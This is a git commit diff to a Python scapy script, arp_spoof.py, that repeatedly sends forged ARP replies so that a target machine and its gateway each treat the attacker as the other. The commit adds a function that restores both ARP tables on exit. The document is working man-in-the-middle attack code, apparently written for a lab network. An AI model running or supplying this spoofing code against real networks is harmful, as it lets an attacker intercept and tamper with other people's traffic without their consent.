0a2676adb099df51eab315f44464e41b9af67be4
Will G <will.gathright@yahoo.com>
2020-12-26 22:25:32 -0500

    Added restore function on exit

--- arp_spoof.py
+++ arp_spoof.py
@@ -22,13 +22,25 @@ def spoof(target_ip,spoof_ip):
     scapy.send(packet, verbose=False)
 
 
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2,pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
+
+
+target_ip = "10.0.2.15"
+gateway_ip = "10.0.2.1"
+
 sent_packets_count = 0
 try:
     while True:
-        spoof("10.0.2.15","10.0.2.1")
-        spoof("10.0.2.1","10.0.2.15")
+        spoof(target_ip,gateway_ip)
+        spoof(gateway_ip,target_ip)
         sent_packets_count += 2
         print("\r[+] Packets Sent: " + str(sent_packets_count), end="")
         time.sleep(2)
 except KeyboardInterrupt:
-    print("[+] Detected Ctrl + C ... Quitting.")
+    print("\n[+] Detected Ctrl + C ... Resetting ARP tables...Please wait\n")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
